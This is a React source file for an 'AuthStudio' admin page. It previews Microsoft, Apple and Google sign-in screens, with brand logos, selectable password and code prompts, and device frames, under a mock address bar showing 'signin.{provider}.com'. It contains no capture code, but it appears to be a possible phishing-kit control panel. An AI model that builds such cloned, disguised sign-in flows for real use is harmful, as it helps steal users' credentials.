import { useState } from 'react';
import { Monitor, Smartphone, Tablet, Moon, Sun, Key, Lock, Mail, LayoutList } from 'lucide-react';

const MicrosoftLogo = () => (
  <svg width="20" height="20" viewBox="0 0 21 21" xmlns="http://www.w3.org/2000/svg">
    <rect x="1" y="1" width="9" height="9" fill="#f25022"/>
    <rect x="11" y="1" width="9" height="9" fill="#7fba00"/>
    <rect x="1" y="11" width="9" height="9" fill="#00a4ef"/>
    <rect x="11" y="11" width="9" height="9" fill="#ffb900"/>
  </svg>
);

const AppleLogo = ({ className }: { className?: string }) => (
  <svg className={className} viewBox="0 0 384 512" xmlns="http://www.w3.org/2000/svg">
    <path fill="currentColor" d="M318.7 268.7c-.2-36.7 16.4-64.4 50-84.8-18.8-26.9-47.2-41.7-84.7-44.6-35.5-2.8-74.3 20.7-88.5 20.7-15 0-49.4-19.7-76.4-19.7C63.3 141.2 4 184.8 4 273.5q0 39.3 14.4 81.2c12.8 36.7 59 126.7 107.2 125.2 25.2-.6 43-17.9 75.8-17.9 31.8 0 48.3 17.9 76.4 17.9 48.6-.7 90.4-82.5 102.6-119.3-65.2-30.7-61.7-90-61.7-91.9zm-56.6-164.2c27.3-32.4 24.8-61.9 24-72.5-24.1 1.4-52 16.4-67.9 34.9-17.5 19.8-27.8 44.3-25.6 71.9 26.1 2 49.9-11.4 69.5-34.3z"/>
  </svg>
);

const GoogleLogo = () => (
  <svg width="20" height="20" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
    <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
    <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
    <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
    <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
  </svg>
);

type Provider = 'microsoft' | 'apple' | 'google';
type Device = 'desktop' | 'tablet' | 'mobile';
type Theme = 'light' | 'dark';
type Prompt = 'password' | 'email-code' | 'other-ways';

const PROVIDER_COLORS: Record<Provider, string> = {
  microsoft: '#0078D4',
  apple: '#007AFF',
  google: '#4285F4',
};

function loginSrc(provider: Provider, device: Device, theme: Theme, prompt: Prompt, phoneEnabled: boolean) {
  const base = import.meta.env.BASE_URL.replace(/\/$/, '');
  const phonePart = provider === 'microsoft' && phoneEnabled ? '&phone=1' : '';
  return `${base}/?provider=${provider}&device=${device}&theme=${theme}&prompt=${prompt}${phonePart}`;
}

function Toggle({ enabled, onToggle }: { enabled: boolean; onToggle: () => void }) {
  return (
    <button
      onClick={onToggle}
      className={`relative w-9 h-5 rounded-full transition-colors flex-shrink-0 focus:outline-none ${enabled ? 'bg-[#0078D4]' : 'bg-[#3a3f4a]'}`}
      aria-pressed={enabled}
    >
      <span
        className={`absolute top-0.5 w-4 h-4 rounded-full bg-white shadow transition-transform ${enabled ? 'translate-x-4' : 'translate-x-0.5'}`}
      />
    </button>
  );
}

export default function AdminPage() {
  const [provider, setProvider] = useState<Provider>('microsoft');
  const [device, setDevice] = useState<Device>('desktop');
  const [theme, setTheme] = useState<Theme>('light');
  const [prompt, setPrompt] = useState<Prompt>('password');
  const [phoneEnabled, setPhoneEnabled] = useState(false);

  const providers: { id: Provider; name: string; icon: React.ReactNode }[] = [
    { id: 'microsoft', name: 'Microsoft', icon: <MicrosoftLogo /> },
    { id: 'apple',     name: 'Apple',     icon: <AppleLogo className="w-[18px] h-[18px]" /> },
    { id: 'google',    name: 'Google',    icon: <GoogleLogo /> },
  ];

  const devices: { id: Device; name: string; icon: React.ReactNode }[] = [
    { id: 'desktop', name: 'Desktop', icon: <Monitor className="w-4 h-4" /> },
    { id: 'tablet',  name: 'Tablet',  icon: <Tablet className="w-4 h-4" /> },
    { id: 'mobile',  name: 'Mobile',  icon: <Smartphone className="w-4 h-4" /> },
  ];

  const prompts: { id: Prompt; name: string; icon: React.ReactNode; desc: string }[] = [
    { id: 'password',    name: 'Password',    icon: <Lock className="w-3.5 h-3.5 text-white" />,       desc: 'Standard password entry' },
    { id: 'email-code',  name: 'Email code',  icon: <Mail className="w-3.5 h-3.5 text-white" />,       desc: 'Send code to email' },
    { id: 'other-ways',  name: 'Other ways',  icon: <LayoutList className="w-3.5 h-3.5 text-white" />, desc: 'Let user choose method' },
  ];

  const src = loginSrc(provider, device, theme, prompt, phoneEnabled);
  const accentColor = PROVIDER_COLORS[provider];

  return (
    <div className="flex h-screen w-full overflow-hidden bg-[#0b0c10] text-[#ececf1] font-sans">
      {/* ── Sidebar ── */}
      <aside className="w-[240px] flex-shrink-0 flex flex-col bg-[#16181d] border-r border-[#2d3139] shadow-xl z-10">

        {/* Logo */}
        <div className="h-14 flex items-center gap-3 px-5 border-b border-[#2d3139]/60 flex-shrink-0">
          <div className="w-6 h-6 rounded-md bg-gradient-to-br from-indigo-500 to-purple-600 flex items-center justify-center shadow">
            <Key className="w-3.5 h-3.5 text-white" />
          </div>
          <span className="text-[15px] font-semibold tracking-tight text-white">AuthStudio</span>
        </div>

        <div className="flex-1 overflow-y-auto p-4 space-y-7">

          {/* Provider */}
          <section className="space-y-2">
            <p className="text-[10px] font-bold uppercase tracking-widest text-[#8a919e] px-1">Provider</p>
            <div className="space-y-1">
              {providers.map(p => (
                <button
                  key={p.id}
                  onClick={() => { setProvider(p.id); if (p.id !== 'microsoft') { setPrompt('password'); setPhoneEnabled(false); } }}
                  data-testid={`provider-btn-${p.id}`}
                  className={`w-full flex items-center gap-3 px-3 py-2.5 rounded-lg transition-all text-left
                    ${provider === p.id ? 'bg-[#23262f]' : 'hover:bg-[#1e2128]'}`}
                >
                  <div className="w-7 h-7 rounded-md bg-white flex items-center justify-center flex-shrink-0 shadow-sm">
                    {p.icon}
                  </div>
                  <span className={`text-[14px] font-medium ${provider === p.id ? 'text-white' : 'text-[#aeb5c0]'}`}>
                    {p.name}
                  </span>
                  {provider === p.id && (
                    <span className="ml-auto w-1.5 h-1.5 rounded-full flex-shrink-0" style={{ backgroundColor: accentColor }} />
                  )}
                </button>
              ))}
            </div>
          </section>

          {/* Device */}
          <section className="space-y-2">
            <p className="text-[10px] font-bold uppercase tracking-widest text-[#8a919e] px-1">Device</p>
            <div className="flex bg-[#0f1115] p-1 rounded-lg border border-[#2d3139]">
              {devices.map(d => (
                <button
                  key={d.id}
                  onClick={() => setDevice(d.id)}
                  data-testid={`device-btn-${d.id}`}
                  className={`flex-1 flex flex-col items-center py-2 rounded-md transition-all gap-1
                    ${device === d.id ? 'bg-[#2d3139] text-white' : 'text-[#8a919e] hover:text-white hover:bg-[#1e2128]'}`}
                >
                  {d.icon}
                  <span className="text-[10px] font-medium">{d.name}</span>
                </button>
              ))}
            </div>
          </section>

          {/* Theme */}
          <section className="space-y-2">
            <p className="text-[10px] font-bold uppercase tracking-widest text-[#8a919e] px-1">Theme</p>
            <div className="flex bg-[#0f1115] p-1 rounded-lg border border-[#2d3139]">
              <button
                onClick={() => setTheme('light')}
                data-testid="theme-btn-light"
                className={`flex-1 flex items-center justify-center gap-1.5 py-2 rounded-md transition-all text-[12px] font-semibold
                  ${theme === 'light' ? 'bg-white text-black' : 'text-[#8a919e] hover:text-white'}`}
              >
                <Sun className="w-3.5 h-3.5" /> Light
              </button>
              <button
                onClick={() => setTheme('dark')}
                data-testid="theme-btn-dark"
                className={`flex-1 flex items-center justify-center gap-1.5 py-2 rounded-md transition-all text-[12px] font-semibold
                  ${theme === 'dark' ? 'bg-[#2d3139] text-white' : 'text-[#8a919e] hover:text-white'}`}
              >
                <Moon className="w-3.5 h-3.5" /> Dark
              </button>
            </div>
          </section>

          {/* Prompt — Microsoft only */}
          {provider === 'microsoft' && (
            <section className="space-y-2">
              <p className="text-[10px] font-bold uppercase tracking-widest text-[#8a919e] px-1">Prompt</p>
              <div className="space-y-1">
                {prompts.map(p => (
                  <button
                    key={p.id}
                    onClick={() => setPrompt(p.id)}
                    className={`w-full flex items-center gap-3 px-3 py-2.5 rounded-lg transition-all text-left
                      ${prompt === p.id ? 'bg-[#23262f]' : 'hover:bg-[#1e2128]'}`}
                  >
                    <div className={`w-7 h-7 rounded-md flex items-center justify-center flex-shrink-0 shadow-sm transition-colors
                      ${prompt === p.id ? 'bg-[#0078D4]' : 'bg-[#2a2d35]'}`}>
                      {p.icon}
                    </div>
                    <div className="flex-1 min-w-0">
                      <div className={`text-[13px] font-medium leading-none mb-0.5 ${prompt === p.id ? 'text-white' : 'text-[#aeb5c0]'}`}>
                        {p.name}
                      </div>
                      <div className="text-[11px] text-[#606672] truncate">{p.desc}</div>
                    </div>
                    {prompt === p.id && (
                      <span className="w-1.5 h-1.5 rounded-full flex-shrink-0 bg-[#0078D4]" />
                    )}
                  </button>
                ))}
              </div>
            </section>
          )}

          {/* Options — Microsoft only */}
          {provider === 'microsoft' && (
            <section className="space-y-2">
              <p className="text-[10px] font-bold uppercase tracking-widest text-[#8a919e] px-1">Options</p>
              <div className="rounded-lg border border-[#2d3139] bg-[#1a1d24] divide-y divide-[#2d3139]">
                <div className="flex items-center justify-between px-3 py-3">
                  <div className="flex items-center gap-2.5">
                    <Smartphone className="w-4 h-4 text-[#6b7280]" />
                    <div>
                      <div className="text-[13px] text-[#aeb5c0] font-medium leading-none mb-0.5">Phone SMS</div>
                      <div className="text-[10px] text-[#606672]">Show phone code option</div>
                    </div>
                  </div>
                  <Toggle enabled={phoneEnabled} onToggle={() => setPhoneEnabled(v => !v)} />
                </div>
              </div>
            </section>
          )}

        </div>

        <div className="h-10 flex items-center justify-center border-t border-[#2d3139]/50 text-[11px] text-[#555d6b] flex-shrink-0">
          AuthStudio v1.0
        </div>
      </aside>

      {/* ── Preview canvas ── */}
      <main
        className="flex-1 flex items-center justify-center relative overflow-hidden"
        style={{ backgroundColor: '#0b0c10' }}
      >
        {/* Provider glow */}
        <div
          className="absolute inset-0 pointer-events-none transition-all duration-1000"
          style={{
            background: `radial-gradient(ellipse at center, ${accentColor}22 0%, transparent 65%)`,
          }}
        />

        {/* Dot grid */}
        <div
          className="absolute inset-0 pointer-events-none opacity-30"
          style={{
            backgroundImage: 'radial-gradient(circle, #ffffff18 1px, transparent 1px)',
            backgroundSize: '24px 24px',
          }}
        />

        <div className="relative z-10 flex items-center justify-center transition-all duration-300">
          {/* DESKTOP frame */}
          {device === 'desktop' && (
            <div
              className="flex flex-col rounded-xl overflow-hidden shadow-2xl ring-1 ring-white/10"
              style={{ width: 980, height: 620, transform: 'scale(0.88)', transformOrigin: 'center center' }}
            >
              <div className="h-9 bg-[#2a2a2a] flex items-center px-4 flex-shrink-0 border-b border-black/30">
                <div className="flex gap-1.5 mr-4">
                  <div className="w-3 h-3 rounded-full bg-[#ff5f56]" />
                  <div className="w-3 h-3 rounded-full bg-[#ffbd2e]" />
                  <div className="w-3 h-3 rounded-full bg-[#27c93f]" />
                </div>
                <div className="flex-1 flex justify-center">
                  <div className="bg-[#1a1a1a] rounded text-[11px] text-[#888] font-mono px-3 py-0.5 w-[340px] text-center truncate">
                    https://signin.{provider}.com
                  </div>
                </div>
              </div>
              <iframe
                key={src}
                src={src}
                className="flex-1 border-0 bg-white"
                title="Login preview"
              />
            </div>
          )}

          {/* TABLET frame */}
          {device === 'tablet' && (
            <div
              className="relative bg-black rounded-[2.5rem] p-4 shadow-2xl ring-4 ring-[#2a2a2a]"
              style={{ width: 600, height: 840, transform: 'scale(0.82)', transformOrigin: 'center center' }}
            >
              <div className="absolute top-1/2 -left-4 w-1.5 h-14 bg-[#2a2a2a] rounded-l-md -translate-y-1/2" />
              <div className="absolute top-1/2 -right-4 w-1.5 h-14 bg-[#2a2a2a] rounded-r-md -translate-y-1/2" />
              <div className="w-full h-full rounded-[2rem] overflow-hidden border border-white/10">
                <iframe key={src} src={src} className="w-full h-full border-0" title="Login preview" />
              </div>
            </div>
          )}

          {/* MOBILE frame */}
          {device === 'mobile' && (
            <div
              className="relative bg-black rounded-[3rem] p-3 shadow-2xl ring-[5px] ring-[#1a1a1a]"
              style={{ width: 340, height: 740, transform: 'scale(0.95)', transformOrigin: 'center center' }}
            >
              <div className="absolute top-24 -left-3.5 w-1.5 h-8 bg-[#1a1a1a] rounded-l-md" />
              <div className="absolute top-36 -left-3.5 w-1.5 h-14 bg-[#1a1a1a] rounded-l-md" />
              <div className="absolute top-52 -left-3.5 w-1.5 h-14 bg-[#1a1a1a] rounded-l-md" />
              <div className="absolute top-32 -right-3.5 w-1.5 h-20 bg-[#1a1a1a] rounded-r-md" />
              <div className="w-full h-full rounded-[2.3rem] overflow-hidden relative bg-white">
                <div className="absolute top-0 inset-x-0 flex justify-center z-20 pointer-events-none">
                  <div className="w-[100px] h-[22px] bg-black rounded-b-3xl" />
                </div>
                <iframe key={src} src={src} className="w-full h-full border-0" title="Login preview" />
              </div>
            </div>
          )}
        </div>
      </main>
    </div>
  );
}
